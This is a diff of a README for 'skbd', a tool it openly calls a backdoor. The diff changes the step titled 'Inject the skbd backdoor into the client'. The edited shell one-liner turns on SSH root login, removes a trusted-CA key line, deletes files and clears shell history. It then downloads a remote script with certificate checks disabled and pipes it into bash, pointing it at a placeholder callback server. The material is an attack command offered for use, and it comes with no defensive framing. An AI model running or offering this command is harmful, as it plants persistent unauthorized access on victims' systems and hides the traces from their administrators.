@@ -100,7 +100,7 @@
 
 3. Inject the skbd backdoor into the client
 
-`$ sed -i "/TrustedUserCAKeys \/etc\/.system\//d" /etc/ssh/sshd_config;rm -rf /etc/.system;service ssh reload;/usr/sbin/sshd -D;history -c;curl -k https://raw.githubusercontent.com/MartinxMax/skbd/refs/heads/main/skbd.sh |bash -s -- -e 'https://<skbd_ip>:9191' -l '<Machine_Internet_IP, optional if not available>' `
+`$ sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config;sed -i "/TrustedUserCAKeys \/etc\/.system\//d" /etc/ssh/sshd_config;rm -rf /etc/.system;service ssh reload;/usr/sbin/sshd -D;history -c;curl -k https://raw.githubusercontent.com/MartinxMax/skbd/refs/heads/main/skbd.sh |bash -s -- -e 'https://<skbd_ip>:9191' -l '<Machine_Internet_IP, optional if not available>' `
 
 ![alt text](pic/image-3.png)
 
